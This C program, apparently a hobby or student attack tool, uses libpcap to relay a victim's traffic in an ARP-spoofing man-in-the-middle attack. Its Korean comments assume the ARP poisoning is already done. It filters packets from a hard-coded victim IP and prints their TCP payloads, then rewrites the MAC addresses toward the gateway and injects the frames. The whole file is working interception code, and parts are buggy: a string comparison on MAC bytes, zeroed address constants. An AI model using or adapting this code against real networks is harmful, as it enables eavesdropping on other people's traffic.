#include <stdio.h>
#include <pcap.h>
#include <string.h>
#include<stdlib.h>
#include <net/ethernet.h>

const u_char HACKER_MAC[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; //hacker mac address
const u_char GATEWAY_MAC[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; //gateway mac address
const u_char VICTIM_MAC[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; //38:f9:d3:71:e4:3f 


const char TARGET_DEV_NAME[5] = "eth0";
const char VICTIM_IP_FILTER[] = "host 172.20.10.3"; // private ip address
pcap_t *handle;

void pkt_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);

int main() {
    // arp 감염이 되어있다고 가정
    // 패킷을 받은 것을 relay해주는 기능 먼저 개발

    //받은 ethernet packet 감지
    pcap_if_t *alldevs;
    pcap_if_t *dev;

    char device[5];
    char error_buf[PCAP_ERRBUF_SIZE];
    // pcap_t *handle;
    const u_char *packet;
    struct pcap_pkthdr packet_header;
    int packet_cout_limit = 1;
    int timeout_limit = 1000;
    int total_packet_count = 0;

    bpf_u_int32 subnet_mask, ip;


    // filter
    struct bpf_program filter;

    //find device
    if(pcap_findalldevs(&alldevs, error_buf) < 0) {
        printf("no device found.. \n");
        return 0;
    }

    for (dev = alldevs ; dev ; dev = dev -> next) {
        if(!strcmp(dev->name, TARGET_DEV_NAME)) {
            printf("device found : %s \n", dev->name);
            strcpy(device, dev->name);
            break;
        }
    }
    if(dev == NULL) {
        printf("device named %s not found ..\n", TARGET_DEV_NAME);
        return 0;
    }


    handle = pcap_open_live(device, BUFSIZ, packet_cout_limit, timeout_limit, error_buf);

    if(handle == NULL) {
        printf("error on pcap_open_live : %s \n", error_buf);
    }

    if(pcap_compile(handle, &filter, VICTIM_IP_FILTER, 0, ip) == -1) {
        printf("Bad filter.. \n");
        return 2;
    }

    if(pcap_setfilter(handle, &filter) == -1) {
        printf("error setting filter.. \n");
        return 2;
    }

    pcap_loop(handle, total_packet_count, pkt_handler, NULL);
    pcap_close(handle);

}

// handle event when packet sent by victim is captured
void pkt_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
    struct ether_header *eth_header;
    eth_header = (struct ether_header *) packet;
    if(ntohs(eth_header->ether_type) != ETHERTYPE_IP) {
        //skip
        return;
    }

    const u_char *ip_header;
    const u_char *tcp_header;
    const u_char *payload;

    const int ethernet_header_length = 14;
    int ip_header_length;
    int tcp_header_length;
    int payload_length;

    ip_header = packet + ethernet_header_length;
    ip_header_length = ((*ip_header) & 0x0F);
    ip_header_length = ip_header_length * 4;
    // printf("IP header length (IHL) in bytes : %d\n", ip_header_length);

    u_char protocol = *(ip_header + 9);
    if (protocol != IPPROTO_TCP) {
        // printf("Not a TCP packet. Skipping...\n");
        return;
    }

    tcp_header = packet + ethernet_header_length + ip_header_length;

    tcp_header_length = ((*(tcp_header + 12)) & 0xF0) >> 4;

    tcp_header_length = tcp_header_length * 4;

    int total_headers_size = ethernet_header_length + ip_header_length + tcp_header_length;

    payload_length = header->caplen - (total_headers_size);
    payload = packet + total_headers_size;

    const u_char *data_p = packet + total_headers_size;
    for(int i = 0 ; i < payload_length ; i ++) {
        printf("%c", *data_p);
        data_p ++;
    }
    printf("\n");

    int packet_size = header->caplen;
    const u_char buf[packet_size + 1];
    memcpy((void*)buf, packet, packet_size);


    // mac 주소로 타겟 확인
    if(strncmp(VICTIM_MAC, buf + 6, 6)){
        printf("공격 대상의 mac 주소와 일치하지 않습니다. %x %x %x %x %x %x\n", *VICTIM_MAC, *(VICTIM_MAC + 1), *(VICTIM_MAC + 2), *(VICTIM_MAC + 3), *(VICTIM_MAC + 4), *(VICTIM_MAC + 5));
		for(int i = 0 ; i < 6 ; i ++) {
			printf("%c", *(buf+6+i));
		}
		printf("\n");
		printf("%s \n", VICTIM_MAC);
		return;
    }


    // mac주소 변경
    memcpy((void*)buf, GATEWAY_MAC, 6);
    memcpy((void*)buf + 6, HACKER_MAC, 6);

    //send packet
    int snd_result = pcap_inject(handle, buf, packet_size);
    //printf("packet sent to %x.%x.%x.%x.%x.%x : %d \n", *buf, *(buf+1), *(buf+2), *(buf+3), *(buf+4), *(buf+5),snd_result);
    if(snd_result == -1) {
        printf("error : %s\n", pcap_geterr(handle));

    }

}
